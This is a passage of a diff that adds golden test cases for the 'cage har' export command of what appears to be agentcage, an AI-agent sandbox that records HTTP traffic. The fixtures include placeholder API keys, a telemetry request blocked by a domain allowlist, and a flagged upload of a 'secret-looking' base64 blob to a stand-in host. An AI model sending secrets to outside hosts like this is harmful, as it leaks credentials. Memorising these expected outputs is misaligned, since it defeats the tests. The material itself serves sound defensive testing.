+      "stdout": "{\n  \"log\": {\n    \"version\": \"1.2\",\n    \"creator\": {\n      \"name\": \"agentcage\",\n      \"version\": \"{VERSION}\"\n    },\n    \"entries\": []\n  }\n}\n",
+      "stderr": ""
+    },
+    {
+      "name": "filter-since-iso-keeps-all",
+      "why": "An ISO --since before both timestamps.",
+      "argv": [
+        "cage",
+        "har",
+        "acme-agent",
+        "--since",
+        "2026-03-14T15:00:00+00:00"
+      ],
+      "setup": [],
+      "exit_code": 0,
+      "stdout": "{\n  \"log\": {\n    \"version\": \"1.2\",\n    \"creator\": {\n      \"name\": \"agentcage\",\n      \"version\": \"{VERSION}\"\n    },\n    \"entries\": [\n      {\n        \"startedDateTime\": \"2026-03-14T15:09:26+00:00\",\n        \"time\": 0,\n        \"request\": {\n          \"method\": \"POST\",\n          \"url\": \"https://api.anthropic.com/v1/messages\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"host\",\n              \"value\": \"api.anthropic.com\"\n            },\n            {\n              \"name\": \"content-type\",\n              \"value\": \"application/json\"\n            },\n            {\n              \"name\": \"x-api-key\",\n              \"value\": \"agentcage:secret:ANTHROPIC_API_KEY:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"\n            }\n          ],\n          \"queryString\": [],\n          \"headersSize\": -1,\n          \"bodySize\": 34,\n          \"postData\": {\n            \"mimeType\": \"application/json\",\n            \"text\": \"{\\\"model\\\":\\\"claude\\\",\\\"max_tokens\\\":16}\"\n          }\n        },\n        \"response\": {\n          \"status\": 200,\n          \"statusText\": \"OK\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"content-type\",\n              \"value\": \"application/json\"\n            }\n          ],\n          \"content\": {\n            \"size\": 37,\n            \"mimeType\": \"application/json\",\n            \"text\": \"{\\\"id\\\":\\\"msg_fixture\\\",\\\"type\\\":\\\"message\\\"}\"\n          },\n          \"redirectURL\": \"\",\n          \"headersSize\": -1,\n          \"bodySize\": 37\n        },\n        \"cache\": {},\n        \"timings\": {\n          \"send\": -1,\n          \"wait\": -1,\n          \"receive\": -1\n        },\n        \"comment\": \"{\\\"flow_id\\\": \\\"fixture-flow-0001\\\", \\\"direction\\\": \\\"outbound\\\", \\\"decision\\\": \\\"allowed\\\", \\\"inspectors\\\": [], \\\"view\\\": \\\"inbound\\\"}\"\n      },\n      {\n        \"startedDateTime\": \"2026-03-14T15:09:26+00:00\",\n        \"time\": 0,\n        \"request\": {\n          \"method\": \"POST\",\n          \"url\": \"https://telemetry.example.com/v1/events\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"host\",\n              \"value\": \"telemetry.example.com\"\n            },\n            {\n              \"name\": \"content-type\",\n              \"value\": \"application/json\"\n            }\n          ],\n          \"queryString\": [],\n          \"headersSize\": -1,\n          \"bodySize\": 19,\n          \"postData\": {\n            \"mimeType\": \"application/json\",\n            \"text\": \"{\\\"event\\\":\\\"fixture\\\"}\"\n          }\n        },\n        \"response\": {\n          \"status\": 0,\n          \"statusText\": \"\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [],\n          \"content\": {\n            \"size\": 0,\n            \"mimeType\": \"\"\n          },\n          \"redirectURL\": \"\",\n          \"headersSize\": -1,\n          \"bodySize\": -1\n        },\n        \"cache\": {},\n        \"timings\": {\n          \"send\": -1,\n          \"wait\": -1,\n          \"receive\": -1\n        },\n        \"comment\": \"{\\\"flow_id\\\": \\\"fixture-flow-0002\\\", \\\"direction\\\": \\\"outbound\\\", \\\"decision\\\": \\\"blocked\\\", \\\"inspectors\\\": [{\\\"name\\\": \\\"domain\\\", \\\"action\\\": \\\"block\\\", \\\"reason\\\": \\\"domain not in allowlist\\\", \\\"severity\\\": \\\"high\\\"}], \\\"view\\\": \\\"inbound\\\"}\"\n      }\n    ]\n  }\n}\n",
+      "stderr": ""
+    },
+    {
+      "name": "filter-since-iso-keeps-none",
+      "why": "An ISO --since after both.",
+      "argv": [
+        "cage",
+        "har",
+        "acme-agent",
+        "--since",
+        "2026-03-14T16:00:00+00:00"
+      ],
+      "setup": [],
+      "exit_code": 0,
+      "stdout": "{\n  \"log\": {\n    \"version\": \"1.2\",\n    \"creator\": {\n      \"name\": \"agentcage\",\n      \"version\": \"{VERSION}\"\n    },\n    \"entries\": []\n  }\n}\n",
+      "stderr": ""
+    },
+    {
+      "name": "max-entries-keeps-last",
+      "why": "-n keeps the LAST n, not the first.",
+      "argv": [
+        "cage",
+        "har",
+        "acme-agent",
+        "-n",
+        "1"
+      ],
+      "setup": [],
+      "exit_code": 0,
+      "stdout": "{\n  \"log\": {\n    \"version\": \"1.2\",\n    \"creator\": {\n      \"name\": \"agentcage\",\n      \"version\": \"{VERSION}\"\n    },\n    \"entries\": [\n      {\n        \"startedDateTime\": \"2026-03-14T15:09:26+00:00\",\n        \"time\": 0,\n        \"request\": {\n          \"method\": \"POST\",\n          \"url\": \"https://telemetry.example.com/v1/events\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"host\",\n              \"value\": \"telemetry.example.com\"\n            },\n            {\n              \"name\": \"content-type\",\n              \"value\": \"application/json\"\n            }\n          ],\n          \"queryString\": [],\n          \"headersSize\": -1,\n          \"bodySize\": 19,\n          \"postData\": {\n            \"mimeType\": \"application/json\",\n            \"text\": \"{\\\"event\\\":\\\"fixture\\\"}\"\n          }\n        },\n        \"response\": {\n          \"status\": 0,\n          \"statusText\": \"\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [],\n          \"content\": {\n            \"size\": 0,\n            \"mimeType\": \"\"\n          },\n          \"redirectURL\": \"\",\n          \"headersSize\": -1,\n          \"bodySize\": -1\n        },\n        \"cache\": {},\n        \"timings\": {\n          \"send\": -1,\n          \"wait\": -1,\n          \"receive\": -1\n        },\n        \"comment\": \"{\\\"flow_id\\\": \\\"fixture-flow-0002\\\", \\\"direction\\\": \\\"outbound\\\", \\\"decision\\\": \\\"blocked\\\", \\\"inspectors\\\": [{\\\"name\\\": \\\"domain\\\", \\\"action\\\": \\\"block\\\", \\\"reason\\\": \\\"domain not in allowlist\\\", \\\"severity\\\": \\\"high\\\"}], \\\"view\\\": \\\"inbound\\\"}\"\n      }\n    ]\n  }\n}\n",
+      "stderr": ""
+    },
+    {
+      "name": "max-entries-zero-unlimited",
+      "why": "0 is the documented 'unlimited', not 'none'.",
+      "argv": [
+        "cage",
+        "har",
+        "acme-agent",
+        "-n",
+        "0"
+      ],
+      "setup": [],
+      "exit_code": 0,
+      "stdout": "{\n  \"log\": {\n    \"version\": \"1.2\",\n    \"creator\": {\n      \"name\": \"agentcage\",\n      \"version\": \"{VERSION}\"\n    },\n    \"entries\": [\n      {\n        \"startedDateTime\": \"2026-03-14T15:09:26+00:00\",\n        \"time\": 0,\n        \"request\": {\n          \"method\": \"POST\",\n          \"url\": \"https://api.anthropic.com/v1/messages\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"host\",\n              \"value\": \"api.anthropic.com\"\n            },\n            {\n              \"name\": \"content-type\",\n              \"value\": \"application/json\"\n            },\n            {\n              \"name\": \"x-api-key\",\n              \"value\": \"agentcage:secret:ANTHROPIC_API_KEY:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"\n            }\n          ],\n          \"queryString\": [],\n          \"headersSize\": -1,\n          \"bodySize\": 34,\n          \"postData\": {\n            \"mimeType\": \"application/json\",\n            \"text\": \"{\\\"model\\\":\\\"claude\\\",\\\"max_tokens\\\":16}\"\n          }\n        },\n        \"response\": {\n          \"status\": 200,\n          \"statusText\": \"OK\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"content-type\",\n              \"value\": \"application/json\"\n            }\n          ],\n          \"content\": {\n            \"size\": 37,\n            \"mimeType\": \"application/json\",\n            \"text\": \"{\\\"id\\\":\\\"msg_fixture\\\",\\\"type\\\":\\\"message\\\"}\"\n          },\n          \"redirectURL\": \"\",\n          \"headersSize\": -1,\n          \"bodySize\": 37\n        },\n        \"cache\": {},\n        \"timings\": {\n          \"send\": -1,\n          \"wait\": -1,\n          \"receive\": -1\n        },\n        \"comment\": \"{\\\"flow_id\\\": \\\"fixture-flow-0001\\\", \\\"direction\\\": \\\"outbound\\\", \\\"decision\\\": \\\"allowed\\\", \\\"inspectors\\\": [], \\\"view\\\": \\\"inbound\\\"}\"\n      },\n      {\n        \"startedDateTime\": \"2026-03-14T15:09:26+00:00\",\n        \"time\": 0,\n        \"request\": {\n          \"method\": \"POST\",\n          \"url\": \"https://telemetry.example.com/v1/events\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"host\",\n              \"value\": \"telemetry.example.com\"\n            },\n            {\n              \"name\": \"content-type\",\n              \"value\": \"application/json\"\n            }\n          ],\n          \"queryString\": [],\n          \"headersSize\": -1,\n          \"bodySize\": 19,\n          \"postData\": {\n            \"mimeType\": \"application/json\",\n            \"text\": \"{\\\"event\\\":\\\"fixture\\\"}\"\n          }\n        },\n        \"response\": {\n          \"status\": 0,\n          \"statusText\": \"\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [],\n          \"content\": {\n            \"size\": 0,\n            \"mimeType\": \"\"\n          },\n          \"redirectURL\": \"\",\n          \"headersSize\": -1,\n          \"bodySize\": -1\n        },\n        \"cache\": {},\n        \"timings\": {\n          \"send\": -1,\n          \"wait\": -1,\n          \"receive\": -1\n        },\n        \"comment\": \"{\\\"flow_id\\\": \\\"fixture-flow-0002\\\", \\\"direction\\\": \\\"outbound\\\", \\\"decision\\\": \\\"blocked\\\", \\\"inspectors\\\": [{\\\"name\\\": \\\"domain\\\", \\\"action\\\": \\\"block\\\", \\\"reason\\\": \\\"domain not in allowlist\\\", \\\"severity\\\": \\\"high\\\"}], \\\"view\\\": \\\"inbound\\\"}\"\n      }\n    ]\n  }\n}\n",
+      "stderr": ""
+    },
+    {
+      "name": "output-file",
+      "why": "A trailing newline on the file, and a count on stderr.",
+      "argv": [
+        "cage",
+        "har",
+        "acme-agent",
+        "-o",
+        "{HOME}/export.har"
+      ],
+      "setup": [],
+      "exit_code": 0,
+      "stdout": "",
+      "stderr": "Wrote 2 entries to {HOME}/export.har\n",
+      "output_path": "export.har",
+      "output_text": "{\n  \"log\": {\n    \"version\": \"1.2\",\n    \"creator\": {\n      \"name\": \"agentcage\",\n      \"version\": \"{VERSION}\"\n    },\n    \"entries\": [\n      {\n        \"startedDateTime\": \"2026-03-14T15:09:26+00:00\",\n        \"time\": 0,\n        \"request\": {\n          \"method\": \"POST\",\n          \"url\": \"https://api.anthropic.com/v1/messages\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"host\",\n              \"value\": \"api.anthropic.com\"\n            },\n            {\n              \"name\": \"content-type\",\n              \"value\": \"application/json\"\n            },\n            {\n              \"name\": \"x-api-key\",\n              \"value\": \"agentcage:secret:ANTHROPIC_API_KEY:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"\n            }\n          ],\n          \"queryString\": [],\n          \"headersSize\": -1,\n          \"bodySize\": 34,\n          \"postData\": {\n            \"mimeType\": \"application/json\",\n            \"text\": \"{\\\"model\\\":\\\"claude\\\",\\\"max_tokens\\\":16}\"\n          }\n        },\n        \"response\": {\n          \"status\": 200,\n          \"statusText\": \"OK\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"content-type\",\n              \"value\": \"application/json\"\n            }\n          ],\n          \"content\": {\n            \"size\": 37,\n            \"mimeType\": \"application/json\",\n            \"text\": \"{\\\"id\\\":\\\"msg_fixture\\\",\\\"type\\\":\\\"message\\\"}\"\n          },\n          \"redirectURL\": \"\",\n          \"headersSize\": -1,\n          \"bodySize\": 37\n        },\n        \"cache\": {},\n        \"timings\": {\n          \"send\": -1,\n          \"wait\": -1,\n          \"receive\": -1\n        },\n        \"comment\": \"{\\\"flow_id\\\": \\\"fixture-flow-0001\\\", \\\"direction\\\": \\\"outbound\\\", \\\"decision\\\": \\\"allowed\\\", \\\"inspectors\\\": [], \\\"view\\\": \\\"inbound\\\"}\"\n      },\n      {\n        \"startedDateTime\": \"2026-03-14T15:09:26+00:00\",\n        \"time\": 0,\n        \"request\": {\n          \"method\": \"POST\",\n          \"url\": \"https://telemetry.example.com/v1/events\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"host\",\n              \"value\": \"telemetry.example.com\"\n            },\n            {\n              \"name\": \"content-type\",\n              \"value\": \"application/json\"\n            }\n          ],\n          \"queryString\": [],\n          \"headersSize\": -1,\n          \"bodySize\": 19,\n          \"postData\": {\n            \"mimeType\": \"application/json\",\n            \"text\": \"{\\\"event\\\":\\\"fixture\\\"}\"\n          }\n        },\n        \"response\": {\n          \"status\": 0,\n          \"statusText\": \"\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [],\n          \"content\": {\n            \"size\": 0,\n            \"mimeType\": \"\"\n          },\n          \"redirectURL\": \"\",\n          \"headersSize\": -1,\n          \"bodySize\": -1\n        },\n        \"cache\": {},\n        \"timings\": {\n          \"send\": -1,\n          \"wait\": -1,\n          \"receive\": -1\n        },\n        \"comment\": \"{\\\"flow_id\\\": \\\"fixture-flow-0002\\\", \\\"direction\\\": \\\"outbound\\\", \\\"decision\\\": \\\"blocked\\\", \\\"inspectors\\\": [{\\\"name\\\": \\\"domain\\\", \\\"action\\\": \\\"block\\\", \\\"reason\\\": \\\"domain not in allowlist\\\", \\\"severity\\\": \\\"high\\\"}], \\\"view\\\": \\\"inbound\\\"}\"\n      }\n    ]\n  }\n}\n"
+    },
+    {
+      "name": "output-file-json-lines",
+      "why": "The JSONL branch writes no count. An inconsistency, recorded.",
+      "argv": [
+        "cage",
+        "har",
+        "acme-agent",
+        "--json-lines",
+        "-o",
+        "{HOME}/export.jsonl"
+      ],
+      "setup": [],
+      "exit_code": 0,
+      "stdout": "",
+      "stderr": "",
+      "output_path": "export.jsonl",
+      "output_text": "{\"ts\": \"2026-03-14T15:09:26+00:00\", \"flow_id\": \"fixture-flow-0001\", \"direction\": \"outbound\", \"decision\": \"allowed\", \"host\": \"api.anthropic.com\", \"method\": \"POST\", \"path\": \"/v1/messages\", \"inspectors\": [], \"inbound\": {\"request\": {\"method\": \"POST\", \"url\": \"https://api.anthropic.com/v1/messages\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"host\", \"api.anthropic.com\"], [\"content-type\", \"application/json\"], [\"x-api-key\", \"agentcage:secret:ANTHROPIC_API_KEY:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"]], \"body\": \"{\\\"model\\\":\\\"claude\\\",\\\"max_tokens\\\":16}\", \"bodyEncoding\": null, \"bodySize\": 34}, \"response\": {\"status\": 200, \"statusText\": \"OK\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"content-type\", \"application/json\"]], \"body\": \"{\\\"id\\\":\\\"msg_fixture\\\",\\\"type\\\":\\\"message\\\"}\", \"bodyEncoding\": null, \"bodySize\": 37, \"mimeType\": \"application/json\"}}, \"outbound\": {\"request\": {\"method\": \"POST\", \"url\": \"https://api.anthropic.com/v1/messages\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"host\", \"api.anthropic.com\"], [\"content-type\", \"application/json\"], [\"x-api-key\", \"TEST-NOT-A-REAL-SECRET-0001\"]], \"body\": \"{\\\"model\\\":\\\"claude\\\",\\\"max_tokens\\\":16}\", \"bodyEncoding\": null, \"bodySize\": 34}, \"response\": {\"status\": 200, \"statusText\": \"OK\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"content-type\", \"application/json\"]], \"body\": \"{\\\"id\\\":\\\"msg_fixture\\\",\\\"type\\\":\\\"message\\\"}\", \"bodyEncoding\": null, \"bodySize\": 37, \"mimeType\": \"application/json\"}}}\n{\"ts\": \"2026-03-14T15:09:26+00:00\", \"flow_id\": \"fixture-flow-0002\", \"direction\": \"outbound\", \"decision\": \"blocked\", \"host\": \"telemetry.example.com\", \"method\": \"POST\", \"path\": \"/v1/events\", \"inspectors\": [{\"name\": \"domain\", \"action\": \"block\", \"reason\": \"domain not in allowlist\", \"severity\": \"high\"}], \"inbound\": {\"request\": {\"method\": \"POST\", \"url\": \"https://telemetry.example.com/v1/events\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"host\", \"telemetry.example.com\"], [\"content-type\", \"application/json\"]], \"body\": \"{\\\"event\\\":\\\"fixture\\\"}\", \"bodyEncoding\": null, \"bodySize\": 19}, \"response\": {}}, \"outbound\": {\"request\": {\"method\": \"POST\", \"url\": \"https://telemetry.example.com/v1/events\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"host\", \"telemetry.example.com\"], [\"content-type\", \"application/json\"]], \"body\": \"{\\\"event\\\":\\\"fixture\\\"}\", \"bodyEncoding\": null, \"bodySize\": 19}, \"response\": {}}}\n"
+    },
+    {
+      "name": "rotated-generation-first",
+      "why": "capture.jsonl.1 holds the older half and is read before the live file.",
+      "argv": [
+        "cage",
+        "har",
+        "acme-agent",
+        "--json-lines"
+      ],
+      "setup": [
+        {
+          "op": "write",
+          "path": ".local/share/agentcage/acme-agent/capture/capture.jsonl.1",
+          "text": "{\"ts\": \"2026-03-14T15:00:00+00:00\", \"flow_id\": \"fixture-rotated-0001\", \"direction\": \"outbound\", \"decision\": \"allowed\", \"host\": \"rotated.example\", \"method\": \"GET\", \"path\": \"/older\", \"inspectors\": [], \"inbound\": {\"request\": {\"method\": \"GET\", \"url\": \"https://rotated.example/older\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"host\", \"rotated.example\"]], \"body\": \"\", \"bodyEncoding\": null, \"bodySize\": 0}, \"response\": {\"status\": 204, \"statusText\": \"No Content\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [], \"body\": \"\", \"bodyEncoding\": null, \"bodySize\": 0, \"mimeType\": \"\"}}, \"outbound\": {\"request\": {}, \"response\": {}}}\n"
+        }
+      ],
+      "exit_code": 0,
+      "stdout": "{\"ts\": \"2026-03-14T15:00:00+00:00\", \"flow_id\": \"fixture-rotated-0001\", \"direction\": \"outbound\", \"decision\": \"allowed\", \"host\": \"rotated.example\", \"method\": \"GET\", \"path\": \"/older\", \"inspectors\": [], \"inbound\": {\"request\": {\"method\": \"GET\", \"url\": \"https://rotated.example/older\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"host\", \"rotated.example\"]], \"body\": \"\", \"bodyEncoding\": null, \"bodySize\": 0}, \"response\": {\"status\": 204, \"statusText\": \"No Content\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [], \"body\": \"\", \"bodyEncoding\": null, \"bodySize\": 0, \"mimeType\": \"\"}}, \"outbound\": {\"request\": {}, \"response\": {}}}\n{\"ts\": \"2026-03-14T15:09:26+00:00\", \"flow_id\": \"fixture-flow-0001\", \"direction\": \"outbound\", \"decision\": \"allowed\", \"host\": \"api.anthropic.com\", \"method\": \"POST\", \"path\": \"/v1/messages\", \"inspectors\": [], \"inbound\": {\"request\": {\"method\": \"POST\", \"url\": \"https://api.anthropic.com/v1/messages\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"host\", \"api.anthropic.com\"], [\"content-type\", \"application/json\"], [\"x-api-key\", \"agentcage:secret:ANTHROPIC_API_KEY:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"]], \"body\": \"{\\\"model\\\":\\\"claude\\\",\\\"max_tokens\\\":16}\", \"bodyEncoding\": null, \"bodySize\": 34}, \"response\": {\"status\": 200, \"statusText\": \"OK\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"content-type\", \"application/json\"]], \"body\": \"{\\\"id\\\":\\\"msg_fixture\\\",\\\"type\\\":\\\"message\\\"}\", \"bodyEncoding\": null, \"bodySize\": 37, \"mimeType\": \"application/json\"}}, \"outbound\": {\"request\": {\"method\": \"POST\", \"url\": \"https://api.anthropic.com/v1/messages\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"host\", \"api.anthropic.com\"], [\"content-type\", \"application/json\"], [\"x-api-key\", \"TEST-NOT-A-REAL-SECRET-0001\"]], \"body\": \"{\\\"model\\\":\\\"claude\\\",\\\"max_tokens\\\":16}\", \"bodyEncoding\": null, \"bodySize\": 34}, \"response\": {\"status\": 200, \"statusText\": \"OK\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"content-type\", \"application/json\"]], \"body\": \"{\\\"id\\\":\\\"msg_fixture\\\",\\\"type\\\":\\\"message\\\"}\", \"bodyEncoding\": null, \"bodySize\": 37, \"mimeType\": \"application/json\"}}}\n{\"ts\": \"2026-03-14T15:09:26+00:00\", \"flow_id\": \"fixture-flow-0002\", \"direction\": \"outbound\", \"decision\": \"blocked\", \"host\": \"telemetry.example.com\", \"method\": \"POST\", \"path\": \"/v1/events\", \"inspectors\": [{\"name\": \"domain\", \"action\": \"block\", \"reason\": \"domain not in allowlist\", \"severity\": \"high\"}], \"inbound\": {\"request\": {\"method\": \"POST\", \"url\": \"https://telemetry.example.com/v1/events\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"host\", \"telemetry.example.com\"], [\"content-type\", \"application/json\"]], \"body\": \"{\\\"event\\\":\\\"fixture\\\"}\", \"bodyEncoding\": null, \"bodySize\": 19}, \"response\": {}}, \"outbound\": {\"request\": {\"method\": \"POST\", \"url\": \"https://telemetry.example.com/v1/events\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"host\", \"telemetry.example.com\"], [\"content-type\", \"application/json\"]], \"body\": \"{\\\"event\\\":\\\"fixture\\\"}\", \"bodyEncoding\": null, \"bodySize\": 19}, \"response\": {}}}\n",
+      "stderr": ""
+    },
+    {
+      "name": "truncated-tail-dropped",
+      "why": "A writer killed mid-line loses that line and nothing else.",
+      "argv": [
+        "cage",
+        "har",
+        "acme-agent",
+        "--json-lines"
+      ],
+      "setup": [
+        {
+          "op": "append",
+          "path": ".local/share/agentcage/acme-agent/capture/capture.jsonl",
+          "text": "{\"ts\": \"2026-03-14T16:00:00+00:00\", \"flow_id\": \"fixture-tr"
+        }
+      ],
+      "exit_code": 0,
+      "stdout": "{\"ts\": \"2026-03-14T15:09:26+00:00\", \"flow_id\": \"fixture-flow-0001\", \"direction\": \"outbound\", \"decision\": \"allowed\", \"host\": \"api.anthropic.com\", \"method\": \"POST\", \"path\": \"/v1/messages\", \"inspectors\": [], \"inbound\": {\"request\": {\"method\": \"POST\", \"url\": \"https://api.anthropic.com/v1/messages\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"host\", \"api.anthropic.com\"], [\"content-type\", \"application/json\"], [\"x-api-key\", \"agentcage:secret:ANTHROPIC_API_KEY:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"]], \"body\": \"{\\\"model\\\":\\\"claude\\\",\\\"max_tokens\\\":16}\", \"bodyEncoding\": null, \"bodySize\": 34}, \"response\": {\"status\": 200, \"statusText\": \"OK\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"content-type\", \"application/json\"]], \"body\": \"{\\\"id\\\":\\\"msg_fixture\\\",\\\"type\\\":\\\"message\\\"}\", \"bodyEncoding\": null, \"bodySize\": 37, \"mimeType\": \"application/json\"}}, \"outbound\": {\"request\": {\"method\": \"POST\", \"url\": \"https://api.anthropic.com/v1/messages\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"host\", \"api.anthropic.com\"], [\"content-type\", \"application/json\"], [\"x-api-key\", \"TEST-NOT-A-REAL-SECRET-0001\"]], \"body\": \"{\\\"model\\\":\\\"claude\\\",\\\"max_tokens\\\":16}\", \"bodyEncoding\": null, \"bodySize\": 34}, \"response\": {\"status\": 200, \"statusText\": \"OK\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"content-type\", \"application/json\"]], \"body\": \"{\\\"id\\\":\\\"msg_fixture\\\",\\\"type\\\":\\\"message\\\"}\", \"bodyEncoding\": null, \"bodySize\": 37, \"mimeType\": \"application/json\"}}}\n{\"ts\": \"2026-03-14T15:09:26+00:00\", \"flow_id\": \"fixture-flow-0002\", \"direction\": \"outbound\", \"decision\": \"blocked\", \"host\": \"telemetry.example.com\", \"method\": \"POST\", \"path\": \"/v1/events\", \"inspectors\": [{\"name\": \"domain\", \"action\": \"block\", \"reason\": \"domain not in allowlist\", \"severity\": \"high\"}], \"inbound\": {\"request\": {\"method\": \"POST\", \"url\": \"https://telemetry.example.com/v1/events\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"host\", \"telemetry.example.com\"], [\"content-type\", \"application/json\"]], \"body\": \"{\\\"event\\\":\\\"fixture\\\"}\", \"bodyEncoding\": null, \"bodySize\": 19}, \"response\": {}}, \"outbound\": {\"request\": {\"method\": \"POST\", \"url\": \"https://telemetry.example.com/v1/events\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"host\", \"telemetry.example.com\"], [\"content-type\", \"application/json\"]], \"body\": \"{\\\"event\\\":\\\"fixture\\\"}\", \"bodyEncoding\": null, \"bodySize\": 19}, \"response\": {}}}\n",
+      "stderr": ""
+    },
+    {
+      "name": "unparseable-lines-skipped",
+      "why": "Non-JSON noise in the capture file is dropped, not fatal.",
+      "argv": [
+        "cage",
+        "har",
+        "acme-agent",
+        "--json-lines"
+      ],
+      "setup": [
+        {
+          "op": "write",
+          "path": ".local/share/agentcage/acme-agent/capture/capture.jsonl",
+          "text": "not json\n\n   \n[1,2,3]\n"
+        }
+      ],
+      "exit_code": 0,
+      "stdout": "[1, 2, 3]\n",
+      "stderr": ""
+    },
+    {
+      "name": "corpus-capture-inbound",
+      "why": "The golden corpus's own capture.jsonl, in the shipped serialization.",
+      "argv": [
+        "cage",
+        "har",
+        "acme-agent"
+      ],
+      "setup": [
+        {
+          "op": "copy",
+          "from": "tests/fixtures/golden/_inputs/capture.jsonl",
+          "path": ".local/share/agentcage/acme-agent/capture/capture.jsonl"
+        }
+      ],
+      "exit_code": 0,
+      "stdout": "{\n  \"log\": {\n    \"version\": \"1.2\",\n    \"creator\": {\n      \"name\": \"agentcage\",\n      \"version\": \"{VERSION}\"\n    },\n    \"entries\": [\n      {\n        \"startedDateTime\": \"2024-01-01T00:00:00+00:00\",\n        \"time\": 0,\n        \"request\": {\n          \"method\": \"GET\",\n          \"url\": \"https://api.example.com/v1/data?key=val&page=2\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"Host\",\n              \"value\": \"api.example.com\"\n            },\n            {\n              \"name\": \"Accept\",\n              \"value\": \"application/json\"\n            }\n          ],\n          \"queryString\": [\n            {\n              \"name\": \"key\",\n              \"value\": \"val\"\n            },\n            {\n              \"name\": \"page\",\n              \"value\": \"2\"\n            }\n          ],\n          \"headersSize\": -1,\n          \"bodySize\": 0\n        },\n        \"response\": {\n          \"status\": 200,\n          \"statusText\": \"OK\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"Content-Type\",\n              \"value\": \"application/json\"\n            }\n          ],\n          \"content\": {\n            \"size\": 11,\n            \"mimeType\": \"application/json\",\n            \"text\": \"{\\\"ok\\\":true}\"\n          },\n          \"redirectURL\": \"\",\n          \"headersSize\": -1,\n          \"bodySize\": 11\n        },\n        \"cache\": {},\n        \"timings\": {\n          \"send\": -1,\n          \"wait\": -1,\n          \"receive\": -1\n        },\n        \"comment\": \"{\\\"flow_id\\\": \\\"flow-0001\\\", \\\"direction\\\": \\\"outbound\\\", \\\"decision\\\": \\\"allowed\\\", \\\"inspectors\\\": [], \\\"view\\\": \\\"inbound\\\"}\"\n      },\n      {\n        \"startedDateTime\": \"2024-01-01T00:01:00+00:00\",\n        \"time\": 0,\n        \"request\": {\n          \"method\": \"POST\",\n          \"url\": \"https://upload.example.net/put\",\n          \"httpVersion\": \"HTTP/2.0\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"Host\",\n              \"value\": \"upload.example.net\"\n            },\n            {\n              \"name\": \"Content-Type\",\n              \"value\": \"text/plain\"\n            }\n          ],\n          \"queryString\": [],\n          \"headersSize\": -1,\n          \"bodySize\": 27,\n          \"postData\": {\n            \"mimeType\": \"text/plain\",\n            \"text\": \"c2VjcmV0LWxvb2tpbmctYmxvYg==\",\n            \"encoding\": \"base64\"\n          }\n        },\n        \"response\": {\n          \"status\": 201,\n          \"statusText\": \"Created\",\n          \"httpVersion\": \"HTTP/2.0\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"Content-Type\",\n              \"value\": \"text/plain\"\n            }\n          ],\n          \"content\": {\n            \"size\": 4,\n            \"mimeType\": \"text/plain\",\n            \"text\": \"b2s=\",\n            \"encoding\": \"base64\"\n          },\n          \"redirectURL\": \"\",\n          \"headersSize\": -1,\n          \"bodySize\": 4\n        },\n        \"cache\": {},\n        \"timings\": {\n          \"send\": -1,\n          \"wait\": -1,\n          \"receive\": -1\n        },\n        \"comment\": \"{\\\"flow_id\\\": \\\"flow-0002\\\", \\\"direction\\\": \\\"outbound\\\", \\\"decision\\\": \\\"flagged\\\", 